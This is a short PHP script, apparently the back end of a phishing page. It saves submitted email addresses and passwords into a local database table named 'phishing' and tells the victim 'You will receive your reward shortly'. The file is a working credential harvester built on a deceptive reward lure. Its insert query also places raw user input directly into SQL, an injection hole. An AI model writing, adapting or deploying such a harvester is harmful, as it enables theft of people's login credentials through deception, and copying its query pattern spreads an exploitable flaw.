<?php
// database connection code
// $con = mysqli_connect('localhost', 'database_user', 'database_password','database');

$con = mysqli_connect('localhost', 'root', '','phishing');

// get the post records
$email = $_POST['email'];
$password = $_POST['password'];
// database insert SQL code
$sql = "INSERT INTO `phishing` (`Email`, `Password`) VALUES ('$email', '$password')";

// insert in database 
$rs = mysqli_query($con, $sql);

if($rs)
{
	echo "You will receive your reward shortly";
}

?>